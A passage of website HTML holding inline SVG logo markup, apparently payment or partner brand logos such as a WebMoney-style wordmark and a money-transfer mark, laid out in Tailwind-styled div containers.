                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.0911C0 52.001 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM59.132 29.7495L58.2493 30.5461L57.4527 29.6611L58.3365 28.8645L59.132 29.7495ZM54.5858 28.9778L53.3904 27.6497L54.7184 26.4543L55.9139 27.7823L54.5858 28.9778ZM55.9411 29.124L57.1377 30.4509L55.8096 31.6463L54.6142 30.3194L55.9411 29.124ZM53.506 28.6843L51.736 30.2775L50.1439 28.5075L51.9139 26.9143L53.506 28.6843ZM53.1785 29.9342L54.7717 31.7041L53.0017 33.2962L51.4085 31.5262L53.1785 29.9342ZM54.4374 32.9937L56.0306 34.7636L54.2606 36.3591L52.6674 34.5891L54.4374 32.9937ZM55.7484 33.124L57.0765 31.9274L58.2731 33.2554L56.945 34.4509L55.7484 33.124ZM58.0034 27.1183L57.1184 27.9149L56.3218 27.0299L57.2068 26.2333L58.0034 27.1183ZM9.28045 34.9529H8.36261L7.20793 30.716H7.14788L6.0272 34.9529H5.10935L3.73371 28.9336H4.68555L5.63626 33.4254H5.69632L6.8 28.9336H7.55581L8.73654 33.4254H8.7966L9.66346 28.9336H10.6572L9.28045 34.9529ZM14.5473 32.9937H11.7802C11.7802 34.0112 12.196 34.4633 13.0708 34.4633C13.5286 34.4633 13.9535 34.3013 14.4204 34.0214V34.6662C14.0385 34.886 13.5286 35.0571 12.9178 35.0571C11.4912 35.0571 10.9054 34.1744 10.9054 32.8316C10.9054 31.541 11.5592 30.6084 12.8329 30.6084C13.8946 30.6084 14.5484 31.2962 14.5484 32.682L14.5473 32.9937ZM16.9756 35.056C16.5258 35.056 15.8289 34.9109 15.319 34.6401V28.7138L16.2017 28.5019V30.9223C16.4578 30.7863 16.8895 30.6084 17.3496 30.6084C18.4023 30.6084 18.9711 31.3393 18.9711 32.6979C18.9711 34.2854 18.2074 35.056 16.9756 35.056ZM25.7496 34.9529H25.7473H24.8306V30.588H24.7547L23.0221 34.9529H22.4793L20.7467 30.69H20.6708V34.9529H19.9071V28.9336H20.9337L22.8363 33.6803H22.8793L24.6969 28.9336H25.7496V34.9529ZM28.6187 35.056C27.4561 35.056 26.6822 34.282 26.6822 32.8305C26.6822 31.3438 27.498 30.6072 28.6187 30.6072C29.7394 30.6072 30.5552 31.3461 30.5552 32.8305C30.5552 34.2854 29.7824 35.056 28.6187 35.056ZM34.928 34.9529H34.0453V32.0735C34.0453 31.4039 33.7156 31.2849 33.2805 31.2849C32.9405 31.2849 32.5076 31.4378 32.2448 31.5908V34.9529H31.362V31.2339C31.7439 31.005 32.5507 30.6061 33.5275 30.6061C34.5462 30.6061 34.928 31.005 34.928 31.8798V34.9529ZM39.3609 32.9937H36.5926C36.5926 34.0112 37.0085 34.4633 37.8856 34.4633C38.3433 34.4633 38.7683 34.3013 39.234 34.0214V34.6662C38.851 34.886 38.3433 35.0571 37.7303 35.0571C36.3037 35.0571 35.7201 34.1744 35.7201 32.8316C35.7201 31.541 36.3739 30.6084 37.6465 30.6084C38.7094 30.6084 39.3632 31.2962 39.3632 32.682L39.3609 32.9937ZM42.0351 34.9971C41.6102 36.1676 41.0924 36.7795 40.1178 36.7795V36.0837C40.6958 36.0837 41.0504 35.6259 41.2555 34.9971L39.6261 30.75H40.5598L41.6465 33.8752H41.6975L42.6652 30.75H43.5739L42.0351 34.9971ZM56.434 38.4724C55.3518 39.09 54.0975 39.4424 52.766 39.4424C48.6674 39.4424 45.3235 36.0996 45.3235 32.001C45.3235 27.9024 48.6674 24.5585 52.766 24.5585C53.9331 24.5585 55.0414 24.8305 56.0272 25.3132C56.1824 25.3869 56.3365 25.4684 56.4895 25.5568L55.8051 26.1699L54.7762 25.1058L53.0391 26.656L52.0091 25.5296L48.7717 28.4463L50.8465 30.7342L50.0306 31.4503L52.0748 33.7404L51.2635 34.4565L54.1847 37.7075L55.9161 36.1121L57.4142 37.8231C57.1173 38.052 56.7932 38.2696 56.434 38.4724ZM58.1122 37.1308L56.9156 35.805L58.2436 34.6084L59.4391 35.9353L58.1122 37.1308ZM59.379 33.1738L58.5824 32.2888L59.4674 31.4922L60.264 32.3772L59.379 33.1738Z"
                fill="currentColor"
              ></path>
              <path
                d="M28.6187 31.2021C28.059 31.2021 27.574 31.6849 27.574 32.8316C27.574 33.9954 28.0159 34.4622 28.6187 34.4622C29.2216 34.4622 29.6635 33.9954 29.6635 32.8316C29.6635 31.6837 29.1955 31.2021 28.6187 31.2021Z"
                fill="currentColor"
              ></path>
              <path
                d="M17.1196 31.2705C16.7819 31.2705 16.5349 31.3634 16.1949 31.5504V34.3277C16.4669 34.4467 16.7627 34.4637 16.9757 34.4637C17.6046 34.4637 18.0805 34.0728 18.0805 32.6971C18.0805 31.6184 17.6884 31.2705 17.1196 31.2705Z"
                fill="currentColor"
              ></path>
              <path
                d="M37.6205 31.1763C37.1015 31.1763 36.7026 31.5751 36.6074 32.4239H38.5542C38.5122 31.5332 38.0782 31.1763 37.6205 31.1763Z"
                fill="currentColor"
              ></path>
              <path
                d="M12.8068 31.1763C12.2889 31.1763 11.8889 31.5751 11.796 32.4239H13.7405C13.6986 31.5332 13.2657 31.1763 12.8068 31.1763Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="42"
              viewBox="0 0 64 42"
              fill="none"
            >
              <rect width="64" height="42" rx="2" fill="currentColor"></rect>
              <g clip-path="url(#clip0)">
                <path
                  d="M27.4111 31.2715C27.3198 31.0151 27.1542 30.8403 27.0343 30.6131C26.7432 30.2227 26.4006 29.8847 26.0581 29.5468C25.9382 29.506 25.8868 29.3894 25.7727 29.3428C25.6984 29.2438 25.5786 29.1913 25.4815 29.1156C25.2874 28.9641 25.0762 28.8359 24.8592 28.7077C24.4482 28.4397 23.9401 28.2707 23.4377 28.0959C22.8954 27.9619 22.3245 27.8628 21.7308 27.7812C21.1428 27.6938 20.5548 27.6123 20.1095 27.3734C19.8526 27.2976 19.6642 27.1519 19.4416 27.0354C19.236 26.8955 19.0134 26.779 18.8421 26.6042C18.6309 26.476 18.4996 26.2604 18.334 26.0856C18.2769 25.9691 18.1799 25.8992 18.1342 25.771C18.0771 25.7477 18.06 25.6777 18.0258 25.6369C17.9858 25.5903 17.9858 25.4971 17.9173 25.4796C17.883 25.7185 17.8945 26.004 17.9173 26.2488C17.9458 26.3537 17.9572 26.4818 17.9858 26.5867C18.0029 26.68 18.0886 26.8315 18.0543 26.9014C16.2731 26.8081 14.9715 26.2313 13.8412 25.4738C13.2817 25.095 12.8022 24.6347 12.3569 24.1394C12.1628 23.8656 11.9515 23.6034 11.7803 23.3004C11.6033 23.0032 11.4549 22.6652 11.295 22.3506C11.0324 21.6689 10.7869 20.9696 10.6956 20.1131C10.5757 19.3148 10.6043 18.2951 10.7812 17.5551C10.844 17.1472 10.9753 16.8034 11.0895 16.448C11.1637 16.2848 11.2436 16.1217 11.3122 15.9527C11.4092 15.8129 11.4606 15.6206 11.5805 15.4982C11.9059 14.8747 12.3911 14.4086 12.8878 13.9599C13.4244 13.5579 14.0353 13.2316 14.7717 13.0334C15.4796 12.8703 16.4444 12.8412 17.2094 13.0101C18.7622 13.3364 19.9325 14.0473 20.9144 14.9563C21.9078 15.8478 22.6728 16.9782 23.198 18.3534C23.7403 19.6586 23.9287 21.6922 23.4435 23.1722C23.2436 23.0556 23.0438 22.9449 22.844 22.8342C22.6043 22.7643 22.3702 22.6827 22.0905 22.6536C21.7536 22.6478 21.4225 22.6536 21.2056 22.7643C21.6452 22.7177 21.9991 22.8401 22.2731 22.9449C22.433 23.009 22.5243 23.0498 22.6499 23.1256C22.8954 23.2712 23.1123 23.4053 23.295 23.6034C23.8145 24.0695 24.1856 24.6872 24.3626 25.5029C24.3626 25.5262 24.3911 25.5204 24.3854 25.4796C24.4082 25.4738 24.4197 25.4563 24.4311 25.433C24.4596 25.398 24.4939 25.3631 24.5224 25.3223C24.5795 25.2524 24.6366 25.1824 24.6766 25.095C24.7965 24.9494 24.8935 24.7862 24.9848 24.6172C25.1961 24.3026 25.3559 23.9413 25.5386 23.5975C25.8526 22.8634 26.1095 22.0709 26.2693 21.1736C26.589 19.1808 26.2065 17.2929 25.5386 15.9003C24.8535 14.496 23.8945 13.3714 22.6556 12.5265C21.4054 11.6874 19.9439 11.0698 17.9344 11.0115C17.923 10.9707 17.9059 11.0174 17.8659 11.0115C16.8041 10.9766 15.9477 11.1281 15.0971 11.3495C14.7032 11.4835 14.2922 11.6 13.9439 11.7807C13.5443 11.9147 13.2246 12.1361 12.8592 12.2993C12.7279 12.4275 12.5281 12.4916 12.3911 12.6139C12.2141 12.7013 12.0828 12.8412 11.9059 12.9286C11.6204 13.1849 11.3179 13.4122 11.0381 13.6744C10.7641 13.9308 10.5243 14.2221 10.2617 14.4902C10.2218 14.5834 10.1533 14.6475 10.0847 14.7174C10.0391 14.8048 9.98199 14.8806 9.90777 14.9447C9.87923 15.0495 9.78789 15.0903 9.75363 15.1952C9.67942 15.2535 9.66229 15.37 9.57666 15.4225C9.50245 15.6089 9.37114 15.7429 9.28551 15.9177C9.18275 16.0867 9.10283 16.2732 9.00007 16.4363C8.84022 16.8151 8.66895 17.1822 8.53765 17.5901C8.40064 17.9863 8.28646 18.4058 8.20654 18.8603C8.1209 19.2857 8.04098 19.8392 8.0524 20.2879C7.99531 20.451 8.04098 20.754 8.0524 20.9463C8.0524 20.9813 8.02956 20.9929 8.02956 21.0162C8.02956 21.2318 8.08665 21.494 8.09807 21.6281C8.14374 22.1233 8.22937 22.5837 8.36638 22.9857C8.45202 23.4344 8.6347 23.784 8.766 24.1861C8.96581 24.524 9.10283 24.9261 9.3426 25.2291C9.51957 25.5845 9.77076 25.8642 10.0105 26.1555C10.2674 26.4352 10.5243 26.7207 10.8326 26.948C11.3978 27.4491 12.06 27.8512 12.785 28.1949C14.138 28.865 16.159 29.302 17.9744 29.1913C18.4368 29.1272 18.9049 29.069 19.3274 28.9641C19.7156 28.8184 20.1666 28.731 20.6347 28.6727C21.7023 28.6028 22.6271 28.7019 23.4492 28.9466C24.2827 29.1738 25.002 29.5176 25.6242 29.9663C25.9553 30.1644 26.2294 30.4208 26.5091 30.6655C26.7945 30.9161 27.0229 31.2249 27.2855 31.5046C27.3198 31.6095 27.3883 31.6852 27.4396 31.7785C27.5082 31.8542 27.4739 32.029 27.6395 32.0057C27.7422 31.9008 27.6223 31.7493 27.6166 31.6211C27.5139 31.5104 27.491 31.3647 27.4111 31.2715Z"
                  fill="#F0F6FE"
                ></path>
                <path
                  d="M23.2655 25.0715C23.2427 25.0715 23.237 25.089 23.2198 25.0949C23.1799 25.1823 23.197 25.3221 23.2198 25.4095C23.3397 25.6601 23.3797 25.9864 23.6423 26.0912C23.7679 26.0505 23.7565 25.864 23.7508 25.6834C23.6937 25.4619 23.6137 25.2638 23.4824 25.1182C23.3911 25.0832 23.3283 25.0249 23.2655 25.0715ZM21.7127 25.7067C21.7127 25.695 21.6956 25.6834 21.6899 25.7067C21.4729 25.6775 21.3987 25.7999 21.2902 25.8873C21.1018 26.3942 21.4044 26.8895 21.9353 26.8837C22.1466 26.8313 22.2779 26.6914 22.3121 26.4525C22.2836 26.0272 22.1066 25.7533 21.7127 25.7067Z"
                  fill="#F0F6FE"
                ></path>
                <path
                  d="M34.5119 24.0928C34.5975 24.4599 34.7802 24.7221 34.9857 24.9668C35.1912 25.2115 35.431 25.4155 35.7222 25.567C35.9962 25.7418 36.293 25.8875 36.6356 25.9865C36.8011 26.0448 36.961 26.1147 37.1665 26.138C37.3092 26.2196 37.4805 26.2604 37.4919 26.4701C37.4862 26.7207 37.3206 26.8139 37.1094 26.8605C36.8982 26.8139 36.6356 26.8198 36.4586 26.7382C36.0133 26.6857 35.6536 26.5401 35.2769 26.4061C34.5575 26.1205 33.9524 25.7068 33.45 25.1999C33.3473 25.0251 33.2046 24.8852 33.0961 24.7163C32.9876 24.5473 32.9134 24.3433 32.7992 24.1744C31.9201 24.0578 31.3206 23.65 30.7954 23.178C30.3102 22.6128 29.922 21.9369 29.7621 21.0395C29.5737 20.1771 29.6308 19.0992 29.8535 18.2659C30.3387 16.6519 31.3549 15.5798 33.2731 15.4341C33.804 15.4516 34.2664 15.5157 34.6889 15.6788C35.117 15.8361 35.5223 16.1275 35.842 16.4305C35.8706 16.4538 35.882 16.4596 35.8991 16.4887C35.9676 16.5878 36.1332 16.7276 36.2245 16.85C36.2417 16.8733 36.236 16.9141 36.2531 16.9432C36.2873 16.9957 36.3387 17.019 36.373 17.0656C36.3901 17.0947 36.3844 17.1297 36.4015 17.153C36.4243 17.188 36.4529 17.2404 36.4871 17.3045C36.4986 17.3278 36.5385 17.3453 36.5442 17.3628C36.5956 17.4618 36.6184 17.5842 36.6641 17.6949C36.7098 17.8114 36.7726 17.9105 36.8125 18.027C36.9267 18.3708 37.0009 18.7787 37.0466 19.1982C37.1608 20.4102 36.9267 21.494 36.4871 22.2981C36.2816 22.7177 35.9962 23.0614 35.6594 23.3528C35.3511 23.6849 34.9286 23.883 34.5119 24.0928ZM33.0961 16.5062C32.8392 16.5237 32.685 16.6461 32.4738 16.716C32.3368 16.8442 32.1655 16.9432 32.0628 17.1064C31.8915 17.2054 31.8458 17.4269 31.7088 17.5551C31.5947 17.8464 31.4862 18.1727 31.412 18.5515C31.3435 18.9244 31.2978 19.3439 31.2921 19.7576C31.2864 20.7948 31.5033 21.8261 31.9086 22.438C32.1484 22.7351 32.4396 22.9799 32.7935 23.1605C32.999 23.178 33.1589 23.2479 33.3815 23.2537C33.5071 23.2071 33.7126 23.2537 33.7926 23.1605C33.9752 23.1721 34.0152 23.0498 34.1751 23.0381C34.2607 22.9507 34.352 22.8808 34.4719 22.8284C34.5804 22.706 34.6831 22.5836 34.7973 22.4671C34.8544 22.3797 34.8887 22.2573 34.9743 22.1932C35.4881 21.191 35.5452 19.3556 35.2084 18.1902C35.0828 17.7648 34.9058 17.421 34.706 17.1355C34.489 16.9083 34.2321 16.716 33.941 16.5645C33.7069 16.5121 33.4843 16.448 33.176 16.4771C33.1589 16.4771 33.1418 16.4829 33.1475 16.5062C33.136 16.5062 33.1189 16.5062 33.0961 16.5062ZM39.3244 15.6613C39.7869 15.6788 40.3292 15.6205 40.7402 15.6905C40.8316 15.8361 40.7973 16.0109 40.7973 16.1741C40.8316 18.3825 40.7973 20.754 40.7973 23.009C40.7973 23.1896 40.803 23.3761 40.7973 23.5509C40.7916 23.7024 40.8316 23.8655 40.7402 24.0054C40.5347 24.0578 40.2379 24.0345 39.9752 24.0345C39.6955 24.0345 39.4215 24.0753 39.2388 23.9763C39.1874 21.3076 39.1874 18.4291 39.2388 15.7546C39.2502 15.7079 39.2788 15.6788 39.3244 15.6613ZM42.8639 15.6613H44.2512C44.3768 15.8361 44.4167 16.0983 44.4567 16.3547C44.8734 17.9746 45.2845 19.6003 45.667 21.2609C45.7583 21.2726 45.7298 21.1619 45.7583 21.1094C45.7983 21.0687 45.7754 20.9696 45.8154 20.9288C45.8325 20.7948 45.9125 20.7249 45.9067 20.5675C46.0095 20.3636 46.0438 20.0839 46.1408 19.8741C46.2607 19.3847 46.4205 18.9302 46.5576 18.4582C46.6889 17.9688 46.8658 17.5259 46.9686 17.0132C47.1627 16.5995 47.2084 16.0342 47.4424 15.6613H48.0304C48.2417 16.0692 48.3216 16.6111 48.5043 17.0481C48.6242 17.5376 48.7897 17.9804 48.9153 18.464C49.2065 19.4022 49.509 20.3286 49.7716 21.2959C49.8915 21.1153 49.8915 20.8123 49.9772 20.6025C50.0285 20.3636 50.0742 20.1189 50.1541 19.9091C50.3825 18.9535 50.5994 17.9921 50.862 17.0773C50.9591 16.5995 51.0561 16.11 51.216 15.6905C51.5585 15.638 52.0837 15.638 52.4263 15.6905C52.4548 16.0459 52.2949 16.4305 52.1922 16.7451C52.1351 17.1297 51.9981 17.4269 51.9239 17.7998C51.7126 18.4815 51.5528 19.2041 51.3359 19.88C51.1703 20.6025 50.9477 21.2668 50.7764 21.9893C50.6622 22.3214 50.5823 22.6885 50.4795 23.044C50.3654 23.3703 50.3254 23.7723 50.1541 24.0404H49.3263C49.1151 23.6616 49.0409 23.1488 48.8525 22.7468C48.4415 21.4183 47.9848 20.1422 47.5851 18.802C47.4481 18.9477 47.4481 19.2448 47.3511 19.4313C47.2883 19.6586 47.2255 19.8858 47.1456 20.0956C47.0314 20.5559 46.8601 20.9463 46.7631 21.4183C46.5975 21.832 46.4776 22.2923 46.352 22.7468C46.1808 23.143 46.118 23.65 45.9067 24.0112C45.6898 24.0811 45.3473 24.0229 45.079 24.0404C44.8734 23.8014 44.8506 23.3703 44.725 23.044C44.628 22.706 44.5595 22.3331 44.4339 22.0184C44.274 21.2842 44.0342 20.6375 43.8744 19.9091C43.6632 19.2332 43.4805 18.5281 43.2864 17.8289C43.1779 17.4968 43.098 17.1414 42.9895 16.8034C42.9381 16.4421 42.6984 16.1158 42.784 15.7196C42.7954 15.6905 42.8297 15.673 42.8639 15.6613ZM54.5157 15.6613C54.9781 15.6788 55.5147 15.6205 55.9315 15.6905C56.0342 16.0051 55.9886 16.3431 55.9886 16.681V23.0032C55.9886 23.347 56.0285 23.6791 55.9315 23.9996C55.6118 24.0345 55.1437 24.052 54.7498 24.0287C54.6356 24.0229 54.4986 24.0578 54.4243 23.9704C54.3216 23.6558 54.3673 23.3236 54.3673 22.974V16.716C54.3673 16.3372 54.333 15.9702 54.4243 15.7196C54.4472 15.6905 54.4814 15.673 54.5157 15.6613Z"
                  fill="#F0F6FE"
                ></path>
              </g>
            </svg>
          </div>
          <div
            class="w-1/12 sm:flex sm:justify-start sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="64"
              height="64"
              viewBox="0 0 64 64"
              fill="none"
            >
              <path
                d="M62.3524 11.2622H1.64759C0.736544 11.2622 0 11.9999 0 12.9098V51.09C0 51.9999 0.736544 52.7387 1.64759 52.7387H62.3524C63.2635 52.7387 64 52.001 64 51.0911V12.9098C64 11.9999 63.2635 11.2622 62.3524 11.2622ZM41.6782 33.8548H48.8669V35.584H43.6816V37.6384H48.4442V39.3653H43.6816V41.8979H49.0969V43.6259H41.6782V33.8548ZM37.6646 23.524C37.9309 23.1988 38.0872 22.8293 38.2629 22.4849C38.4544 22.1449 38.5688 21.7959 38.664 21.4673C38.7547 21.1387 38.8895 20.8407 38.9235 20.5619C38.9677 20.282 39.0085 20.0384 39.038 19.8378C39.1037 19.431 39.1399 19.1988 39.1399 19.1988C39.1399 19.1988 39.1547 19.4333 39.1785 19.8435C39.1921 20.0509 39.2045 20.3047 39.2238 20.5937C39.2487 20.886 39.1853 21.209 39.1626 21.5716C39.1377 21.9342 39.098 22.3296 38.9745 22.733C38.8703 23.141 38.7819 23.5886 38.5734 24.0078C38.4827 24.2254 38.3875 24.4452 38.2912 24.6684C38.1881 24.8894 38.0453 25.09 37.9207 25.3053C37.6759 25.7472 37.3564 26.1393 37.0266 26.5325C36.7082 26.9404 36.3116 27.2599 35.9513 27.6214C35.5513 27.9217 35.1739 28.2673 34.7649 28.5132C34.3649 28.7829 33.9683 29.0265 33.5762 29.2282C33.1909 29.4514 32.8068 29.6078 32.4567 29.7755C31.9139 30.0056 31.4334 30.1846 31.0357 30.3138C31.2159 30.7217 31.3722 31.1466 31.4924 31.601C31.6147 32.069 31.7258 32.5472 31.753 33.0934C31.2204 32.9619 30.7728 32.7614 30.3388 32.5506C29.9048 32.3364 29.5059 32.0939 29.1331 31.8333C28.383 31.3132 27.7371 30.7047 27.1479 30.0509C26.7014 29.5546 26.6414 28.8463 26.9473 28.2934L27.0108 28.1835C27.5071 27.2939 28.1031 26.4633 28.834 25.7143C29.1955 25.3381 29.5955 24.9857 30.0397 24.6582C30.2674 24.4962 30.5009 24.3398 30.7433 24.1891C30.9938 24.0429 31.2601 23.9058 31.5513 23.7846C31.5807 24.0973 31.5864 24.3976 31.5705 24.6866C31.5513 24.9721 31.5229 25.252 31.489 25.5285C31.4074 26.0735 31.2839 26.5925 31.1195 27.0888C31.1014 27.1421 31.0799 27.192 31.0629 27.2452C31.2363 27.2191 31.4176 27.1897 31.6136 27.1546C31.9207 27.0798 32.2686 27.0254 32.6153 26.9121C32.9745 26.8203 33.3394 26.6945 33.7088 26.5472C34.0963 26.4203 34.4408 26.2095 34.834 26.0384C35.1751 25.8118 35.5796 25.6225 35.9014 25.3483C36.2425 25.0877 36.587 24.8225 36.8623 24.5007C37.0074 24.3444 37.1728 24.2005 37.2997 24.035C37.421 23.8639 37.5422 23.6951 37.6646 23.524ZM24.5042 24.7285C24.5405 24.3659 24.5904 23.9727 24.7263 23.5727C24.8431 23.1682 24.9439 22.724 25.1649 22.3104C25.2635 22.0973 25.3632 21.8786 25.4663 21.6588C25.5762 21.4424 25.7258 21.2463 25.8572 21.0344C26.1133 20.5993 26.4465 20.2174 26.7875 19.8344C27.1173 19.4344 27.5252 19.1285 27.8958 18.7772C28.3025 18.4894 28.6901 18.1563 29.106 17.9217C29.5139 17.6633 29.9173 17.431 30.3161 17.2418C30.7071 17.031 31.0969 16.886 31.4516 16.7285C32 16.5155 32.4873 16.35 32.8884 16.2322C32.7207 15.8197 32.5768 15.3903 32.4691 14.9325C32.3603 14.4611 32.264 13.9795 32.2527 13.4322C32.7796 13.5795 33.2227 13.7948 33.651 14.018C34.0782 14.2446 34.4691 14.4973 34.834 14.7716C35.5683 15.3143 36.196 15.9421 36.766 16.6129C37.1977 17.1217 37.2351 17.8322 36.9133 18.375L36.8476 18.4837C36.3229 19.3585 35.7009 20.1699 34.9507 20.8973C34.5768 21.2633 34.1643 21.6044 33.7133 21.9183C33.481 22.0713 33.2419 22.2208 32.9938 22.3648C32.7388 22.5041 32.4691 22.6322 32.1745 22.7455C32.1552 22.4305 32.1586 22.1302 32.1813 21.8424C32.2108 21.5568 32.247 21.2781 32.2901 21.0027C32.3887 20.4611 32.5269 19.9455 32.706 19.4537C32.7252 19.4016 32.7467 19.3517 32.7671 19.2996C32.5926 19.32 32.4113 19.3438 32.2142 19.3733C31.9048 19.439 31.5547 19.4843 31.2045 19.5863C30.8431 19.6679 30.4759 19.7823 30.1008 19.9183C29.7088 20.0327 29.3575 20.2333 28.9598 20.3931C28.6096 20.6095 28.204 20.7874 27.872 21.0514C27.5241 21.303 27.1728 21.5568 26.8861 21.8707C26.7399 22.0225 26.57 22.1608 26.4374 22.324C26.3105 22.4905 26.1847 22.6571 26.0612 22.8203C25.7858 23.1376 25.6181 23.5024 25.4323 23.8424C25.2272 24.1755 25.1048 24.5211 24.9983 24.8475C24.8975 25.1727 24.7547 25.4673 24.7116 25.7449C24.6595 26.0225 24.613 26.265 24.5756 26.4645C24.4997 26.8701 24.4567 27.1013 24.4567 27.1013C24.4567 27.1013 24.4487 26.8667 24.4351 26.4554C24.4295 26.2469 24.4215 25.9942 24.4125 25.7041C24.3943 25.4118 24.4691 25.0911 24.5042 24.7285ZM18.6119 45.7449H17.2045V49.5716H16.2357V45.7449H14.8306V44.9211H18.613L18.6119 45.7449ZM17.1524 43.6259L14.3898 33.8526H16.5654C17.8176 39.2044 17.9422 39.8843 18.119 40.9993H18.1462C18.3229 39.9784 18.4714 38.9846 19.5071 33.8526H21.6714C22.8136 39.218 22.911 39.7347 23.1275 40.9993H23.1547C23.3178 40.0735 23.4799 39.2293 24.7479 33.8526H26.817L24.0657 43.6259H22.1065C21.0992 38.835 20.9201 37.882 20.5949 36.0033H20.5688C20.2674 37.8832 20.1065 38.5891 19.0572 43.6259H17.1524ZM22.0113 49.5682C21.9467 49.3495 21.9093 49.1104 21.9093 48.6299C21.9093 47.9976 21.8697 47.7495 21.1501 47.7495H20.1473V49.5693H19.1932V44.9177H21.5456C22.783 44.9177 23.0085 45.8333 23.0085 46.2344C23.0085 46.7466 22.749 47.1863 22.289 47.3427C22.6708 47.5092 22.8793 47.6531 22.8793 48.5211C22.8793 49.1999 22.8793 49.3699 23.0856 49.4458L23.0867 49.5682H22.0113ZM26.7445 49.5716L26.4453 48.6129H24.7297L24.4068 49.5716H23.3824L25.0402 44.9211H26.162L27.7994 49.5716H26.7445ZM27.8992 33.8526H29.9399V43.6259H27.8992V33.8526ZM31.1977 49.5716L29.3008 46.256H29.2873V49.5716H28.3819V44.9211H29.404L31.2521 48.1585H31.2635V44.9211H32.17L32.1711 49.5716H31.1977ZM34.8578 49.6962C33.1603 49.6962 32.8703 48.7172 32.8703 48.1415H33.7994C33.8062 48.401 33.9365 48.8928 34.7864 48.8928C35.2442 48.8928 35.7575 48.7829 35.7575 48.2911C35.7575 47.9274 35.4085 47.8311 34.9144 47.7143L34.417 47.5976C33.6646 47.4231 32.9405 47.2543 32.9405 46.2299C32.9405 45.7121 33.217 44.7988 34.7263 44.7988C36.1518 44.7988 36.5326 45.7313 36.5394 46.3013H35.6102C35.5807 46.0951 35.506 45.6021 34.6561 45.6021C34.289 45.6021 33.8459 45.737 33.8459 46.1585C33.8459 46.5223 34.145 46.5993 34.3399 46.6446L35.4708 46.9234C36.1076 47.0798 36.6901 47.3393 36.6901 48.1733C36.6901 49.5716 35.2646 49.6962 34.8578 49.6962ZM35.9569 39.8005H33.8482V43.6259H31.8448V33.8514H36.7841C39.3847 33.8514 39.8629 35.771 39.8629 36.6152C39.8629 37.6917 39.319 38.6163 38.3513 38.9427C39.1547 39.2973 39.5898 39.5988 39.5898 41.422C39.5898 42.8509 39.5898 43.2056 40.0261 43.3676V43.6259H37.7688C37.6329 43.1636 37.5513 42.6605 37.5513 41.652C37.5513 40.3183 37.4686 39.8016 35.9569 39.8005ZM40.7411 45.7449H38.4045V46.7942H40.4499V47.6169H38.4045V49.5727H37.4334V44.9223H40.7411V45.7449ZM44.9246 49.5693H41.3949V44.9177H44.8147V45.7427H42.3467V46.7206H44.613V47.5432H42.3467V48.7478H44.9246V49.5693ZM49.6113 49.5693H48.5382C48.4737 49.3495 48.4363 49.1104 48.4363 48.6299C48.4363 47.9976 48.3943 47.7495 47.6771 47.7495H46.6742V49.5693H45.7201V44.9177H48.0703C49.3077 44.9177 49.5354 45.8333 49.5354 46.2344C49.5354 46.7466 49.2725 47.1863 48.8147 47.3427C49.1955 47.5092 49.4051 47.6531 49.4051 48.5211C49.4051 49.1999 49.4051 49.3699 49.6102 49.4458H49.6113V49.5693Z"
                fill="currentColor"
              ></path>
              <path
                d="M36.3932 35.542H33.8505V38.155H36.2425C37.3054 38.155 37.8233 37.7879 37.8233 36.8213C37.8233 36.3046 37.5932 35.542 36.3932 35.542Z"
                fill="currentColor"
              ></path>
              <path
                d="M47.881 45.7256H46.6731V46.9698H47.8108C48.3173 46.9698 48.5632 46.7941 48.5632 46.3341C48.5632 46.0871 48.4533 45.7256 47.881 45.7256Z"
                fill="currentColor"
              ></path>
              <path
                d="M25.5955 45.9717H25.5864L24.9893 47.8108H26.1757L25.5955 45.9717Z"
                fill="currentColor"
              ></path>
              <path
                d="M21.3564 45.7256H20.1462V46.9698H21.2839C21.7904 46.9698 22.0363 46.7953 22.0363 46.3341C22.0363 46.0871 21.9253 45.7256 21.3564 45.7256Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
        </div>
        <div class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-center">
          <div
            class="w-2/12 sm:-mr-1 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="120"
              height="120"
              viewBox="0 0 120 120"
              fill="none"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M50.5478 58.3351L49.6171 62.4495H40.018L40.1649 61.911H41.8788L44.181 51.3314H42.3687L42.5642 50.7437H48.3433L48.1964 51.3314H46.3356L44.034 61.911H45.8948C47.1194 61.911 47.6087 61.9595 48.3925 61.2741C48.9802 60.7842 49.7148 59.7065 50.0578 58.3357H50.5478V58.3351ZM54.5146 62.7421C52.6539 62.7421 51.1355 61.1745 51.1355 59.1182C51.1355 56.3759 53.8292 54.1715 55.9347 54.1715C57.8447 54.1715 59.1184 55.9351 59.1184 57.649C59.1184 58.6775 58.7268 59.6574 58.1391 60.5874C57.0615 62.155 55.6408 62.7421 54.5146 62.7421ZM57.3553 56.3759C57.3553 55.4452 56.9638 54.662 55.9839 54.662C55.2493 54.662 54.5146 55.1028 54.1224 55.739C53.5839 56.6697 52.8493 58.9713 52.8493 60.2936C52.8493 61.6651 53.6823 62.1065 54.3677 62.1065C54.9062 62.1065 55.4939 61.8605 55.8369 61.4696C56.4246 60.7835 56.8168 59.5104 57.0615 58.4334C57.2084 57.649 57.3553 57.0613 57.3553 56.3759ZM63.7221 54.4168L63.3306 56.3759C64.0154 54.7106 65.4366 54.0737 66.6114 54.0737C67.4929 54.0737 68.3745 54.3676 68.3745 55.5921C68.3745 55.9351 68.3259 56.2284 68.2773 56.5228L67.2003 60.6366C67.0534 61.3712 67.102 61.1751 67.0534 61.3227C66.955 61.7641 67.2489 61.7641 67.445 61.7641C67.7394 61.7641 67.9835 61.5686 68.131 61.3712C68.621 60.7356 68.5712 60.8825 68.964 60.1473L69.5025 60.4411C69.1097 61.2741 68.3265 62.7427 66.8081 62.7427C66.0735 62.7427 65.4379 62.2528 65.4379 61.3712C65.4379 61.1266 65.4864 60.9311 65.535 60.6366L66.5149 56.3273C66.5635 56.0821 66.612 55.8374 66.6618 55.6413C66.7589 55.1028 66.2204 54.9067 65.926 